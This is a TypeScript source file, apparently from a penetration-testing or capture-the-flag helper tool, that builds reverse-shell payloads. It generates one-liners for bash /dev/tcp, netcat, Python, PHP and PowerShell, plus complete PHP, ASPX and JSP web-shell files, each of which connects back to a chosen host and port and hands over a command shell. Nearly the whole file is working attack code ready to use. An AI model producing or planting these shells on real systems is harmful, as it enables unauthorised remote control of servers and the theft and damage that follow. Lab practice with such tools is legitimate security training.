export type ShellPayloadKind =
  "bash" | "nc-mkfifo" | "nc-e" | "python3" | "php" | "powershell";

export const SHELL_PAYLOAD_KINDS: { id: ShellPayloadKind; label: string }[] = [
  { id: "nc-mkfifo", label: "netcat (mkfifo, -e 없는 netcat용)" },
  { id: "nc-e", label: "netcat -e" },
  { id: "bash", label: "Bash (/dev/tcp)" },
  { id: "python3", label: "Python3" },
  { id: "php", label: "PHP" },
  { id: "powershell", label: "PowerShell" },
];

// Standard, widely-published one-liners (pentestmonkey-style cheat sheet) —
// getting one of these onto the RCE point (webshell param, command
// injection, upload) is close to universal across every box, so this is
// text generation only; nothing here executes anything itself.
export function buildReverseShellPayload(
  kind: ShellPayloadKind, lhost: string, lport: string,
): string {
  switch (kind) {
    case "bash":
      return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
    case "nc-e":
      return `nc -e /bin/sh ${lhost} ${lport}`;
    case "nc-mkfifo":
      return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
    case "python3":
      return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));` +
        `[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
    case "php":
      return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    case "powershell":
      return `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});` +
        `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
        `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);` +
        `$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);` +
        `$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`;
    default:
      return "";
  }
}

export type WebshellFileKind = "php" | "aspx" | "jsp";

export const WEBSHELL_FILE_KINDS: { id: WebshellFileKind; label: string; filename: string }[] = [
  { id: "php", label: "PHP", filename: "reverse-shell.php" },
  { id: "aspx", label: "ASPX", filename: "reverse-shell.aspx" },
  { id: "jsp", label: "JSP", filename: "reverse-shell.jsp" },
];

// File-upload-vulnerability targets need a droppable file, not a one-liner
// for an existing command-execution point — same public, widely-circulated
// shells referenced by name in most OSCP/HTB walkthroughs (php-reverse-
// shell.php, reverse.aspx), just generated with LHOST/LPORT already filled
// in instead of requiring a manual edit after download.
export function buildWebshellFile(
  kind: WebshellFileKind, lhost: string, lport: string,
): string {
  switch (kind) {
    case "php":
      return phpWebshell(lhost, lport);
    case "aspx":
      return aspxWebshell(lhost, lport);
    case "jsp":
      return jspWebshell(lhost, lport);
    default:
      return "";
  }
}

function phpWebshell(lhost: string, lport: string): string {
  const ip = lhost.replace(/'/g, "\\'");
  const port = parseInt(lport, 10) || 0;
  return `<?php
// Minimal PHP reverse shell: pipes /bin/sh's stdio straight through the
// connected socket via proc_open, so no manual read/write loop is needed.
set_time_limit(0);
$ip = '${ip}';
$port = ${port};
$sock = fsockopen($ip, $port);
$descriptors = array(0 => $sock, 1 => $sock, 2 => $sock);
$process = proc_open('/bin/sh -i', $descriptors, $pipes);
`;
}

function aspxWebshell(lhost: string, lport: string): string {
  const ip = lhost.replace(/"/g, '\\"');
  const port = parseInt(lport, 10) || 0;
  return `<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<script Language="c#" runat="server">
Socket socket;
Process process;
StreamWriter streamWriter;

void Page_Load(object sender, EventArgs e)
{
    Connect("${ip}", ${port});
}

public void Connect(string ip, int port)
{
    socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    socket.Connect(new IPEndPoint(IPAddress.Parse(ip), port));
    process = new Process();
    process.StartInfo.FileName = "cmd.exe";
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.CreateNoWindow = true;
    process.StartInfo.RedirectStandardInput = true;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.RedirectStandardError = true;
    process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
    process.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
    process.Start();
    process.BeginOutputReadLine();
    process.BeginErrorReadLine();
    streamWriter = process.StandardInput;

    byte[] bytesReceived = new byte[4096];
    int bytes;
    while (true)
    {
        bytes = socket.Receive(bytesReceived, bytesReceived.Length, 0);
        if (bytes <= 0) break;
        streamWriter.WriteLine(Encoding.ASCII.GetString(bytesReceived, 0, bytes));
        streamWriter.Flush();
    }
}

public void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
    if (!String.IsNullOrEmpty(outLine.Data))
    {
        try
        {
            byte[] outputBuffer = Encoding.ASCII.GetBytes(outLine.Data + "\\r\\n");
            socket.Send(outputBuffer, outputBuffer.Length, SocketFlags.None);
        }
        catch (Exception) { }
    }
}
</script>
`;
}

function jspWebshell(lhost: string, lport: string): string {
  const ip = lhost.replace(/"/g, '\\"');
  const port = parseInt(lport, 10) || 0;
  return `<%@ page import="java.io.*" %>
<%
// Shells out to the OS's own bash reverse-shell one-liner rather than
// hand-rolling Java socket plumbing -- reliable on any JSP container that
// can spawn a process.
Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c",
  "bash -i >& /dev/tcp/${ip}/${port} 0>&1"});
%>
`;
}
